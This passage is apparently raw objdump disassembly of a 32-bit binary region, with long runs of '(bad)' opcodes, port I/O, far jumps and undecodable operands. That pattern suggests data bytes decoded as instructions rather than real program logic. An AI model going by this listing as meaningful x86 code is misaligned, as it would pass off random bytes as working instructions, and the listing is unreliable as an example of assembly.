  4174d9:	push   es
  4174da:	cmp    al,0x5
  4174dc:	repz stc 
  4174de:	int    0xaa
  4174e0:	sbb    dh,ah
  4174e2:	mov    dl,0x2e
  4174e4:	push   es
  4174e5:	xlat   BYTE PTR ds:[ebx]
  4174e6:	arpl   di,si
  4174e8:	std    
  4174e9:	rol    BYTE PTR [esi],cl
  4174eb:	mov    ?,WORD PTR [eax+0x1b]
	...
  417555:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41755b:	fdivr  st(7),st
  41755d:	mov    edi,0x212a686b
  417562:	inc    esp
  417563:	in     eax,dx
  417564:	in     al,dx
  417565:	js     0x4175ce
  417567:	sti    
  417568:	add    BYTE PTR [eax],al
  41756a:	add    BYTE PTR [ecx],al
  41756c:	add    BYTE PTR [eax],al
  41756e:	sbb    eax,0xcf12024f
  417573:	(bad)  
  417574:	xchg   ecx,eax
  417575:	(bad)  
  417577:	lods   al,BYTE PTR ds:[esi]
  417578:	std    
  417579:	test   al,bh
  41757b:	pop    ds
  41757c:	lods   al,BYTE PTR ds:[esi]
  41757d:	arpl   WORD PTR [eax-0x5],si
  417580:	repnz (bad) 
  417582:	xor    ch,dh
  417584:	int    0xee
  417586:	xchg   edx,eax
  417587:	fwait
  417588:	xor    DWORD PTR [esi+0x3],ecx
  41758b:	jl     0x417585
  41758d:	(bad)  
  41758e:	jmp    0xcb40e187
  417593:	adc    DWORD PTR [eax],edx
  417595:	dec    edi
  417596:	cmp    BYTE PTR [ebp-0x67],cl
  417599:	loop   0x417578
  41759b:	aas    
  41759c:	fcom   DWORD PTR [esi+0x6cb04ac1]
  4175a2:	dec    DWORD PTR [edi+esi*2-0x7e3dc934]
  4175a9:	int    0x92
  4175ab:	jbe    0x4175b8
  4175ad:	pushf  
  4175ae:	jmp    0x4175bb
  4175b0:	hlt    
  4175b1:	retf   
  4175b2:	sti    
  4175b3:	pop    edx
  4175b4:	pop    ebx
  4175b5:	sub    DWORD PTR [edx],esp
  4175b7:	retf   0x63db
  4175ba:	data16 jne 0x41753f
  4175bd:	test   DWORD PTR [ebx-0x6c],0x63308fb4
  4175c4:	mov    WORD PTR [ebx],gs
  4175c6:	push   ecx
  4175c7:	pop    esi
  4175c8:	xchg   ebx,eax
  4175c9:	push   edi
  4175ca:	jb     0x417577
  4175cc:	mov    al,0x48
  4175ce:	out    dx,eax
  4175cf:	imul   ecx,DWORD PTR [ecx-0x7a915ad5],0xffffffb2
  4175d6:	pop    edi
  4175d7:	pop    es
  4175d8:	jle    0x417590
  4175da:	lods   al,BYTE PTR ds:[esi]
  4175db:	sub    BYTE PTR [ecx+ebp*1],ch
  4175de:	repz push edi
  4175e0:	xchg   edi,eax
  4175e1:	sbb    al,0xfb
  4175e3:	fnstenv [edx+0x63]
  4175e6:	fwait
  4175e7:	pop    ecx
  4175e8:	inc    esi
  4175e9:	add    ch,BYTE PTR [ecx+0xd1602bb]
  4175ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175f0:	(bad)  
  4175f1:	and    DWORD PTR [esi],edi
  4175f3:	cmp    al,0x29
  4175f5:	retf   0x88d1
  4175f8:	lea    edx,[ebx-0x53]
  4175fb:	pop    edx
  4175fc:	outs   dx,DWORD PTR ds:[esi]
  4175fd:	mov    ebp,0xc78651da
  417602:	cmp    DWORD PTR [edi],0x2f49a784
  417608:	out    0x2f,al
  41760a:	cld    
  41760b:	pop    es
  41760c:	mov    edi,DWORD PTR [ebx]
  41760e:	push   ss
  41760f:	(bad)  [ecx]
  417611:	mov    al,ds:0x7a5033f5
  417616:	sti    
  417617:	jl     0x4175c3
  417619:	lds    ebp,FWORD PTR [esp+esi*8+0x35bfd933]
  417620:	mov    eax,DWORD PTR [ebp+0x1811808a]
  417626:	xchg   esp,eax
  417627:	retf   
  417628:	idiv   BYTE PTR [ecx]
  41762a:	clc    
  41762b:	(bad)  
  41762c:	(bad)  
  41762d:	and    DWORD PTR [esi],esi
  41762f:	pop    ss
  417630:	or     al,dh
  417632:	jnp    0x4175f1
  417634:	(bad)  
  417635:	push   edi
  417636:	rcr    ecx,cl
  417638:	clc    
  417639:	adc    edx,DWORD PTR [ebx-0x48]
  41763c:	mov    ah,0x32
  41763e:	xchg   ecx,eax
  41763f:	aad    0x3d
  417641:	into   
  417642:	int3   
  417643:	sar    BYTE PTR [esi+0x730f2e22],cl
  417649:	push   es
  41764a:	jo     0x41768e
  41764c:	jg     0x41766d
  41764e:	pop    ds
  41764f:	fucom  st(6)
  417651:	dec    BYTE PTR ds:[edx+0x78e1d83a]
  417658:	ins    DWORD PTR es:[edi],dx
  417659:	xor    edi,eax
  41765b:	in     al,0xc
  41765d:	arpl   WORD PTR [esi-0x3e],di
  417660:	xchg   edi,eax
  417661:	jnp    0x417693
  417663:	ja     0x417640
  417665:	pop    ecx
  417666:	xchg   DWORD PTR [ecx+0x4e],esi
  417669:	hlt    
  41766a:	add    cl,BYTE PTR ds:0x41fd
	...
  4176d4:	add    BYTE PTR [eax],al
  4176d6:	test   eax,0xdf4fd367
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fidivr DWORD PTR [ebx+0x6788de6e]
  4176e7:	cld    
  4176e8:	add    BYTE PTR [eax],al
  4176ea:	add    BYTE PTR [ecx],al
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	rol    ch,0x41
  4176f1:	push   cs
  4176f2:	mov    dh,BYTE PTR [edi+0x412879e6]
  4176f8:	dec    ebx
  4176f9:	xor    edi,esp
  4176fb:	push   ecx
  4176fc:	mov    edi,0x18d6b254
  417701:	dec    eax
  417702:	dec    eax
  417703:	mov    eax,DWORD PTR [edi+esi*8+0x71]
  417707:	add    bh,BYTE PTR [eax+0x71f8f093]
  41770d:	test   BYTE PTR [ecx-0xce0e874],ch
  417713:	jne    0x4176b2
  417715:	sub    al,0xa4
  417717:	push   0x6c
  417719:	jp     0x4176fb
  41771b:	sub    ch,BYTE PTR [esi+0x3a625b15]
  417721:	jno    0x417710
  417723:	inc    BYTE PTR [edx+0x307ba203]
  417729:	(bad)  
  41772a:	out    0xdf,al
  41772c:	fldenv [esi+ecx*4+0x1b]
  417730:	mov    ebp,0x17344dcf
  417735:	pusha  
  417736:	push   DWORD PTR [edi+eiz*8+0x126fd23d]
  41773d:	mov    esi,0x257de7c9
  417742:	xor    dh,BYTE PTR [edi]
  417744:	(bad)  
  417746:	xchg   ecx,eax
  417747:	popf   
  417748:	xchg   edx,eax
  417749:	inc    edx
  41774a:	jle    0x417736
  41774c:	jle    0x4176fc
  41774e:	push   ss
  41774f:	(bad)  
  417750:	mov    ecx,0x84cf6e3d
  417755:	push   0xffffff86
  417757:	xor    bl,BYTE PTR [ebx-0x7ae84a70]
  41775d:	sahf   
  41775e:	inc    eax
  41775f:	push   esp
  417760:	cmc    
  417761:	cmp    al,0xc
  417763:	jns    0x417771
  417765:	push   cs
  417766:	mov    bl,0x1a
  417768:	scas   al,BYTE PTR es:[edi]
  417769:	rcl    eax,0x45
  41776c:	pop    ebp
  41776d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41776e:	mov    WORD PTR [ebx+0x49],?
  417771:	aaa    
  417772:	or     BYTE PTR [edi-0x3b06d943],bh
  417778:	arpl   WORD PTR [ebx],cx
  41777a:	push   es
  41777b:	or     dh,BYTE PTR [ecx+0xd]
  41777e:	rcr    DWORD PTR [edi+0x135615cf],0x57
  417785:	jmp    0x41772a
  417787:	jae    0x417710
  417789:	les    edx,FWORD PTR [ecx-0x122e601c]
  41778f:	out    0x11,al
  417791:	mov    dh,0xc7
  417793:	mov    edi,0x24cd56f8
  417798:	inc    edx
  417799:	hlt    
  41779a:	mov    fs,WORD PTR [edx+0x4d]
  41779d:	sbb    bh,BYTE PTR [esi]
  41779f:	loopne 0x417781
  4177a1:	cli    
  4177a2:	repz pop ecx
  4177a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177a5:	ja     0x4177aa
  4177a7:	mov    ds:0xbefc3625,eax
  4177ac:	dec    eax
  4177ad:	inc    ebx
  4177ae:	inc    eax
  4177af:	inc    eax
  4177b0:	and    DWORD PTR [esi+0x62b390a7],edi
  4177b6:	mov    WORD PTR [edi+0x13],?
  4177b9:	shl    BYTE PTR [edi],1
  4177bb:	or     ebx,DWORD PTR [ecx]
  4177bd:	pavgb  mm6,QWORD PTR [ebx+0x77]
  4177c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177c2:	aas    
  4177c3:	imul   eax,DWORD PTR ds:[edi],0x454c76c2
  4177ca:	imul   eax,DWORD PTR [eax+ebp*4-0x7d],0xffffff91
  4177cf:	jne    0x4177d7
  4177d1:	je     0x417831
  4177d3:	xchg   edx,eax
  4177d4:	jne    0x4177a3
  4177d6:	in     al,0x7d
  4177d8:	dec    ecx
  4177d9:	test   BYTE PTR [ebx+0x662ae8b5],ch
  4177df:	mov    esp,0xb03f527b
  4177e4:	aam    0xe7
  4177e6:	(bad)  [edi]
  4177e8:	dec    esp
  4177e9:	mov    edi,0x3949474b
	...
  417856:	jmp    0xff597669
  41785b:	imul   ecx
  41785d:	(bad)  
  41785e:	lahf   
  41785f:	repnz and dl,dl
  417862:	xchg   edi,eax
  417863:	inc    ebp
  417864:	outs   dx,DWORD PTR ds:[esi]
  417865:	ja     0x4178ce
  417867:	std    
  417868:	add    BYTE PTR [eax],al
  41786a:	add    BYTE PTR [ecx],al
  41786c:	add    BYTE PTR [eax],al
  41786e:	cmp    ebx,DWORD PTR [ebx+0x772d23c5]
  417874:	lods   al,BYTE PTR ds:[esi]
  417875:	sar    DWORD PTR [edx+0x43e7e63d],1
  41787b:	xchg   ebp,eax
  41787c:	push   0x6e
  41787e:	xor    BYTE PTR [ecx+eiz*2+0x63],dl
  417882:	enter  0xeded,0xe4
  417886:	fisttp QWORD PTR [edi-0x11]
  417889:	pop    ebp
  41788a:	xor    bl,BYTE PTR [edi+esi*8]
  41788d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41788e:	inc    esi
  41788f:	adc    BYTE PTR [ecx+0x6f3ab08b],dh
  417895:	inc    edi
  417896:	adc    eax,0xe7e96295
  41789b:	inc    esp
  41789c:	sub    eax,0x591d0857
  4178a1:	out    dx,al
  4178a2:	jle    0x4178ff
  4178a4:	ss dec edx
  4178a6:	xchg   DWORD PTR [edi],esp
  4178a8:	call   0x1360b622
  4178ad:	mov    edi,0xd829da96
  4178b2:	xchg   ch,dl
  4178b4:	inc    ebx
  4178b5:	into   
  4178b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178b7:	add    al,0x1b
  4178b9:	push   eax
  4178ba:	sahf   
  4178bb:	ficom  WORD PTR [edi]
  4178bd:	push   ds
  4178be:	dec    esp
  4178bf:	cwde   
  4178c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178c1:	imul   edi,DWORD PTR [ebp-0x29],0xe341f698
  4178c8:	sub    bh,bl
  4178ca:	mov    ebp,0xd94c33aa
  4178cf:	jo     0x417901
  4178d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178d2:	jl     0x41788e
  4178d4:	aam    0xc8
  4178d6:	ret    0xd962
  4178d9:	sub    al,0x87
  4178db:	dec    eax
  4178dc:	das    
  4178dd:	jnp    0x4178ac
  4178df:	stos   BYTE PTR es:[edi],al
  4178e0:	stos   DWORD PTR es:[edi],eax
  4178e1:	fdivr  st,st(1)
  4178e3:	dec    ebp
  4178e4:	cmc    
  4178e5:	popf   
  4178e6:	mov    ch,0x23
  4178e8:	dec    esi
  4178e9:	ret    
  4178ea:	lods   al,BYTE PTR fs:[esi]
  4178ec:	in     eax,0xe
  4178ee:	pop    ebp
  4178ef:	xor    ebp,DWORD PTR [ecx*2+0x527b4e71]
  4178f6:	fwait
  4178f7:	add    ch,BYTE PTR [esi]
  4178f9:	ficomp WORD PTR [ebp-0x10]
  4178fc:	daa    
  4178fd:	push   ebp
  4178fe:	jmp    0x41797b
  417900:	jmp    0x4178c0
  417902:	mov    esp,0x6587b552
  417907:	lods   eax,DWORD PTR ds:[esi]
  417908:	jns    0x417955
  41790a:	push   ss
  41790b:	push   edx
  41790c:	outs   dx,BYTE PTR ds:[esi]
  41790d:	fmul   QWORD PTR [edx]
  41790f:	jmp    0xb3ef:0x8b63ae5
  417916:	arpl   WORD PTR [edi-0x2ae2c95c],cx
  41791c:	sub    al,BYTE PTR [ecx-0x57]
  41791f:	mov    edx,0x413bce7a
  417924:	adc    eax,0xc4082cf7
  417929:	mov    ebp,DWORD PTR [esi+0x65b148c7]
  41792f:	jp     0x4178e8
  417931:	dec    edx
  417932:	and    dl,BYTE PTR fs:[edi]
  417935:	mov    ecx,0x67268b4a
  41793a:	fucomip st,st(2)
  41793c:	es ins DWORD PTR es:[edi],dx
  41793e:	dec    eax
  41793f:	das    
  417940:	or     esi,DWORD PTR [ebp-0x76988b6c]
  417946:	sub    bh,ch
  417948:	mov    ch,0x1b
  41794a:	push   ebp
  41794b:	clc    
  41794c:	dec    edi
  41794d:	dec    esp
  41794e:	iret   
  41794f:	add    eax,0x36444ef7
  417954:	lds    esi,FWORD PTR [ecx+0x70ca590f]
  41795a:	mov    eax,0x21494c98
  41795f:	push   ds
  417960:	rol    DWORD PTR [edi-0x4a],1
  417963:	fwait
  417964:	dec    ecx
  417965:	xchg   DWORD PTR [eax+eiz*4+0x63b831e8],esi
  41796c:	inc    edx
	...
  4179d5:	add    BYTE PTR [eax+0x41],bl
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	mov    esp,0x67f34e02
  4179e7:	inc    BYTE PTR [eax]
  4179e9:	add    BYTE PTR [eax],al
  4179eb:	add    DWORD PTR [eax],eax
  4179ed:	add    bh,al
  4179ef:	jg     0x4179d1
  4179f1:	in     eax,dx
  4179f2:	clc    
  4179f3:	mov    al,0xa2
  4179f5:	loop   0x417a69
  4179f7:	icebp  
  4179f8:	add    BYTE PTR [ebx+0xc807480],ch
  4179fe:	iret   
  4179ff:	adc    DWORD PTR [eax-0x42],edx
  417a02:	ror    DWORD PTR [eax],0xd3
  417a05:	cmp    ebx,DWORD PTR [ebp-0x6d]
  417a08:	push   ss
  417a09:	call   0x463cca68
  417a0e:	jbe    0x4179a0
  417a10:	arpl   WORD PTR [edi+0x4c4badd5],si
  417a16:	jae    0x417a54
  417a18:	jno    0x417a6b
  417a1a:	sub    al,0xc4
  417a1c:	les    ecx,FWORD PTR [eax-0x17]
  417a1f:	jmp    0x88d90abc
  417a24:	pushf  
  417a25:	fiadd  WORD PTR [edx-0x44]
  417a28:	jmp    0xae08a20
  417a2d:	mov    edi,0xc5391cf6
  417a32:	and    eax,0xdf00ff9
  417a37:	pop    eax
  417a38:	jg     0x417a60
  417a3a:	mov    WORD PTR [ebp+0x27b6242f],?
  417a40:	add    al,0xcb
  417a42:	mov    BYTE PTR [edx-0x36798775],0xfe
  417a49:	dec    eax
  417a4a:	jo     0x417a80
  417a4c:	mov    ebp,DWORD PTR [edx]
  417a4e:	mov    al,ds:0xf735d4cd
  417a53:	xchg   edx,eax
  417a54:	xchg   esp,eax
  417a55:	cmp    DWORD PTR [ecx+ebx*8+0x34],ebp
  417a59:	std    
  417a5a:	out    0x65,eax
  417a5c:	test   eax,0xad801dc4
  417a61:	in     eax,dx
  417a62:	test   al,0x7d
  417a64:	jp     0x417a54
  417a66:	ror    BYTE PTR [ebx+0x2291629a],cl
  417a6c:	call   FWORD PTR [ebx]
  417a6e:	jmp    0x11a0:0x69a37e7d
  417a75:	(bad)  
  417a76:	mov    WORD PTR [eax],ds
  417a78:	xchg   esi,eax
  417a79:	xchg   ebp,eax
  417a7a:	cmp    eax,0x751c84a5
  417a7f:	inc    eax
  417a80:	outs   dx,DWORD PTR ds:[esi]
  417a81:	icebp  
  417a82:	adc    ecx,DWORD PTR [esi]
  417a84:	imul   edi,ebp,0xffffffdd
  417a87:	stos   BYTE PTR es:[edi],al
  417a88:	push   esi
  417a89:	pop    esi
  417a8a:	mov    ecx,0xf9628c4
  417a8f:	inc    eax
  417a90:	rcl    DWORD PTR [ecx+eiz*1-0x16],0x9b
  417a95:	inc    ecx
  417a96:	data16 hlt 
  417a98:	mov    esi,0x9f9cb387
  417a9d:	sbb    ebx,DWORD PTR ds:0xa0fd6780
  417aa3:	imul   edx,DWORD PTR [ebp-0x58],0xd0ff8d91
  417aaa:	outs   dx,BYTE PTR ds:[esi]
  417aab:	pop    ebx
  417aac:	jne    0x417a7d
  417aae:	ins    BYTE PTR es:[edi],dx
  417aaf:	loopne 0x417ab4
  417ab1:	mov    ds:0xb6b827b4,al
  417ab6:	mov    eax,ds:0x2dcfa788
  417abb:	inc    edi
  417abc:	adc    al,0x56
  417abe:	std    
  417abf:	nop
  417ac0:	in     eax,dx
  417ac1:	mov    esp,0xd9c409db
  417ac6:	and    al,0x6b
  417ac8:	add    eax,0x10d4440b
  417acd:	and    al,0x79
  417acf:	push   es
  417ad0:	sar    eax,cl
  417ad2:	pop    edx
  417ad3:	call   0x7338bfaf
  417ad8:	xchg   edx,eax
  417ad9:	mov    ss,WORD PTR [edx+0x522678e3]
  417adf:	push   eax
  417ae0:	mov    gs,ebx
  417ae2:	mov    ebp,0xb64723b6
  417ae7:	sbb    DWORD PTR [eax+0x1],ebx
  417aea:	xchg   ecx,eax
  417aeb:	lea    ecx,[ebx+eax*1+0x0]
	...
  417b53:	add    BYTE PTR [eax],al
  417b55:	add    BYTE PTR [edi],ch
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx+0x52d58c1d]
  417b66:	inc    DWORD PTR [bx+si]
  417b69:	add    BYTE PTR [eax],al
  417b6b:	add    DWORD PTR [eax],eax
  417b6d:	add    BYTE PTR [esi+0x4ba3c647],cl
  417b73:	pop    esp
  417b74:	je     0x417b2a
  417b76:	pop    ss
  417b77:	add    BYTE PTR [eax],0x8e
  417b7a:	sbb    al,0xa5
  417b7c:	jae    0x417bc2
  417b7e:	(bad)  
  417b7f:	cmp    al,0xbc
  417b81:	or     al,0x3f
  417b83:	adc    eax,0xef512df4
  417b88:	or     dl,BYTE PTR [esp+eiz*2-0x5f]
  417b8c:	nop
  417b8d:	popa   
  417b8e:	in     eax,dx
  417b8f:	in     al,0x8d
  417b91:	das    
  417b92:	xchg   ebp,eax
  417b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b94:	(bad)  
  417b95:	xchg   esi,eax
  417b96:	iret   
  417b97:	and    BYTE PTR [edi+0x1172f167],ch
  417b9d:	push   0xffffff85
  417b9f:	std    
  417ba0:	push   ecx
  417ba1:	xchg   ebx,eax
  417ba2:	push   ecx
  417ba3:	xor    BYTE PTR [edx+0x6c9475f8],dh
  417ba9:	cwde   
  417baa:	dec    ebp
  417bab:	loope  0x417b99
  417bad:	stos   DWORD PTR es:[edi],eax
  417bae:	sub    ecx,eax
  417bb0:	and    BYTE PTR [ecx],dl
  417bb2:	push   esi
  417bb3:	pop    eax
  417bb4:	test   DWORD PTR [edi],ebx
  417bb6:	pinsrw mm3,edx,0xf0
  417bba:	(bad)  
  417bbb:	aaa    
  417bbc:	xchg   ebp,eax
  417bbd:	xlat   BYTE PTR ds:[ebx]
  417bbe:	jmp    0xf7e6:0x41362f17
  417bc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bc6:	or     eax,0xc240a161
  417bcb:	jae    0x417b59
  417bcd:	and    DWORD PTR ds:0xc27b6e72,esp
  417bd3:	xchg   esi,eax
  417bd4:	mov    esp,0xd6618e6c
  417bd9:	(bad)  
  417bda:	repz push edi
  417bdc:	aaa    
  417bdd:	cld    
  417bde:	(bad)
  417be2:	stc    
  417be3:	fwait
  417be4:	ins    BYTE PTR es:[edi],dx
  417be5:	cmc    
  417be6:	ja     0x417c62
  417be8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417be9:	jb     0x417bd5
  417beb:	cmp    dh,dl
  417bed:	mov    eax,ds:0x68faa009
  417bf2:	cmc    
  417bf3:	pop    esi
  417bf4:	or     eax,DWORD PTR [edx+edx*2+0x21]
  417bf8:	shl    DWORD PTR [esp+ebp*2],1
  417bfb:	stos   DWORD PTR es:[edi],eax
  417bfc:	jne    0x417c05
  417bfe:	in     eax,dx
  417bff:	dec    edx
  417c00:	sbb    DWORD PTR [ebp-0x41],ebp
  417c03:	(bad)  
  417c04:	jne    0x417c7e
  417c06:	scas   eax,DWORD PTR es:[edi]
  417c07:	mov    WORD PTR [eax+0x5a562abb],?
  417c0d:	sub    BYTE PTR [esi+0x2d],al
  417c10:	fld    QWORD PTR [eax-0x48]
  417c13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c14:	inc    edx
  417c15:	sbb    DWORD PTR [edi],ecx
  417c17:	sub    al,0x4e
  417c19:	pop    edi
  417c1a:	push   ds
  417c1b:	aas    
  417c1c:	fiadd  DWORD PTR [edx]
  417c1e:	xchg   ecx,eax
  417c1f:	(bad)  [ebx-0x4e36424a]
  417c25:	mov    ds:0xf693d15d,al
  417c2a:	jno    0x417c9e
  417c2c:	xlat   BYTE PTR ds:[ebx]
  417c2d:	xchg   esi,eax
  417c2e:	fidivr WORD PTR [eax]
  417c30:	and    BYTE PTR [ebx],dh
  417c32:	xor    esp,esp
  417c34:	repnz stos BYTE PTR es:[edi],al
  417c36:	daa    
  417c37:	mov    eax,ds:0xaffed525
  417c3c:	and    esp,ecx
  417c3e:	(bad)  
  417c3f:	jbe    0x960b20f9
  417c45:	or     ebx,DWORD PTR [edi-0x7b]
  417c48:	not    bh
  417c4a:	xchg   ecx,eax
  417c4b:	xor    al,0x97
  417c4d:	jno    0x417bd4
  417c4f:	mov    al,0x20
  417c51:	outs   dx,BYTE PTR ds:[esi]
  417c52:	inc    esi
  417c53:	adc    al,0x9a
  417c55:	add    eax,0xbc62b61c
  417c5a:	push   0x9b48832c
  417c5f:	pop    edx
  417c60:	and    DWORD PTR [edx],ebp
  417c62:	pop    ss
  417c63:	push   es
  417c64:	dec    ebx
  417c65:	les    eax,FWORD PTR [ecx+ebx*1]
  417c68:	icebp  
  417c69:	add    BYTE PTR [ecx],bh
  417c6b:	jge    0x417cc9
  417c6d:	dec    edx
	...
  417cd6:	mov    eax,eax
  417cd8:	nop
  417cd9:	test   cl,bl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0x8c
  417ce3:	cwde   
  417ce4:	cs push 0x67
  417ce7:	add    BYTE PTR [ecx],al
  417ce9:	add    BYTE PTR [eax],al
  417ceb:	add    DWORD PTR [eax],eax
  417ced:	add    ch,dl
  417cef:	jge    0x417ca4
  417cf1:	jl     0x417d26
  417cf3:	add    dh,dl
  417cf5:	and    eax,ecx
  417cf7:	push   edx
  417cf8:	je     0x417d71
  417cfa:	adc    ecx,DWORD PTR [ebx+ecx*2]
  417cfd:	sub    al,0x3a
  417cff:	scas   al,BYTE PTR es:[edi]
  417d00:	or     ah,BYTE PTR [esi-0x5a]
  417d03:	xlat   BYTE PTR ds:[ebx]
  417d04:	sub    al,BYTE PTR [edx+0x5a]
  417d07:	mov    WORD PTR ds:0x3a47d01c,gs
  417d0d:	mov    ebx,ecx
  417d0f:	daa    
  417d10:	mov    eax,0x62e061f7
  417d15:	cmp    DWORD PTR [edx-0xf7ddb0a],ebp
  417d1b:	scas   eax,DWORD PTR es:[edi]
  417d1c:	adc    dl,ch
  417d1e:	pop    ebx
  417d1f:	push   esp
  417d20:	cdq    
  417d21:	xchg   ecx,eax
  417d22:	in     al,0xb4
  417d24:	xchg   edx,eax
  417d25:	les    eax,FWORD PTR [ecx-0x20]
  417d28:	je     0x417ccf
  417d2a:	outs   dx,DWORD PTR ds:[esi]
  417d2b:	aaa    
  417d2c:	repnz sub ecx,DWORD PTR [edx-0x62fb0e59]
  417d33:	imul   edi,DWORD PTR [esi],0x1a
  417d36:	xchg   ah,dl
  417d38:	push   0xfea01ed0
  417d3d:	sbb    edx,DWORD PTR [eax-0x6276fabf]
  417d43:	dec    edi
  417d44:	mov    edi,0xbbcbeec7
  417d49:	out    0xaf,al
  417d4b:	jmp    0x275b:0xc3329bce
  417d52:	inc    ebx
  417d53:	les    esp,FWORD PTR [ebx+0x27a243c0]
  417d59:	xchg   esp,eax
  417d5a:	push   ebp
  417d5b:	test   al,0x37
  417d5d:	sub    ah,BYTE PTR [esi-0x4d]
  417d60:	cmp    eax,DWORD PTR [edx+0x3edee49c]
  417d66:	je     0x417d27
  417d68:	scas   al,BYTE PTR es:[edi]
  417d69:	ret    
  417d6a:	test   eax,0x2788282f
  417d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d70:	sbb    BYTE PTR [esi+0x2f],dl
  417d73:	mov    al,ds:0xa28cc8fd
  417d78:	jge    0x417dc3
  417d7a:	in     eax,0x8e
  417d7c:	mov    ebx,0x4580e824
  417d81:	or     eax,DWORD PTR [ebp-0x6c]
  417d84:	push   ss
  417d85:	gs scas al,BYTE PTR es:[edi]
  417d87:	aam    0xdc
  417d89:	pop    esi
  417d8a:	out    dx,al
  417d8b:	xor    ch,0x8e
  417d8e:	xor    cl,cl
  417d90:	mov    DWORD PTR [edx+eax*4-0x6],ebp
  417d94:	add    al,0xfa
  417d96:	sub    eax,DWORD PTR [ebx+edx*4]
  417d99:	cld    
  417d9a:	(bad)
  417d9d:	xchg   esi,eax
  417d9e:	jmp    0x83f3:0x1193ea97
  417da5:	in     al,dx
  417da6:	int3   
  417da7:	inc    edx
  417da8:	ds std 
  417daa:	or     DWORD PTR [ecx-0x51],ecx
  417dad:	pop    esp
  417dae:	cmp    DWORD PTR [edx],0xa0ae8def
  417db4:	idiv   DWORD PTR [ebp+0x6e]
  417db7:	pop    edx
  417db8:	cmp    eax,0x65e82e73
  417dbd:	paddusb mm7,QWORD PTR gs:[edi+0x56]
  417dc2:	sub    BYTE PTR [eax-0x16],0xe3
  417dc6:	(bad)  
  417dc7:	repz dec ebx
  417dc9:	test   eax,0x12c97498
  417dce:	nop
  417dcf:	fsubr  QWORD PTR [ebp-0x35]
  417dd2:	mov    BYTE PTR [edi+edx*1+0x7f092e80],0x6d
  417dda:	push   edi
  417ddb:	add    BYTE PTR [esi],dh
  417ddd:	add    BYTE PTR [esi+0x23],bh
  417de0:	pushf  
  417de1:	xchg   edx,eax
  417de2:	inc    edi
  417de3:	xchg   al,bh
  417de5:	fidivr WORD PTR [edi+0x2a]
  417de8:	sub    ebx,DWORD PTR [esi]
  417dea:	jge    0x417dd8
  417dec:	push   ebx
  417ded:	mov    DWORD PTR [eax],0x0
	...
  417e53:	add    BYTE PTR [eax],al
  417e55:	add    BYTE PTR [edi],dl
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	xor    al,0xce
  417e64:	les    ebx,FWORD PTR [ebp+0x67]
  417e67:	add    DWORD PTR [ecx],eax
  417e69:	add    BYTE PTR [eax],al
  417e6b:	add    DWORD PTR [eax],eax
  417e6d:	add    BYTE PTR [edx+0x6dc2ce2],cl
  417e73:	sbb    DWORD PTR [ebp+0x77df1223],esi
  417e79:	adc    DWORD PTR [edi],edi
  417e7b:	loopne 0x417e7c
  417e7d:	(bad)  
  417e7e:	mov    ds:0xdd209937,eax
  417e83:	add    eax,0x98fc2e66
  417e88:	clc    
  417e89:	stos   BYTE PTR es:[edi],al
  417e8a:	into   
  417e8b:	int3   
  417e8c:	cld    
  417e8d:	ret    
  417e8e:	xor    esp,DWORD PTR [edi-0x2dfb1c6c]
  417e94:	inc    ebx
  417e95:	mov    esp,0xd85ada31
  417e9a:	and    BYTE PTR [ebp-0x60],dh
  417e9d:	push   edx
  417e9e:	(bad)  
  417ea0:	jmp    0x417e6c
  417ea2:	inc    edi
  417ea3:	loopne 0x417eae
  417ea5:	xchg   edi,eax
  417ea6:	xchg   al,bh
  417ea8:	imul   edi,DWORD PTR [ecx],0xa380f95a
  417eae:	fdiv   DWORD PTR [ecx]
  417eb0:	mov    cl,0xcc
  417eb2:	mov    edx,0xbc3c6979
  417eb7:	int    0xd8
  417eb9:	pop    eax
  417eba:	(bad)  
  417ebb:	mov    edx,0x6cd252a
  417ec0:	add    BYTE PTR [edi+0x7fefee2f],al
  417ec6:	mov    bl,0xe5
  417ec8:	int    0x85
  417eca:	cmp    ah,BYTE PTR [esp+ebx*4]
  417ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ece:	jle    0x417f20
  417ed0:	sbb    bh,al
  417ed2:	test   al,0xbe
  417ed4:	cmc    
  417ed5:	fisubr DWORD PTR [esi+eax*4-0x69]
  417ed9:	ins    BYTE PTR es:[edi],dx
  417eda:	mov    ds:0x56f9951,eax
  417edf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ee0:	pop    ss
  417ee1:	es push ebp
  417ee3:	push   esp
  417ee4:	push   cs
  417ee5:	jne    0x417e80
  417ee7:	cmp    edi,DWORD PTR [ebx]
  417ee9:	adc    DWORD PTR [esi+0x218748d4],ecx
  417eef:	mov    BYTE PTR [eax+ebx*2+0x79],ch
  417ef3:	(bad)  [esp+ecx*2-0x26]
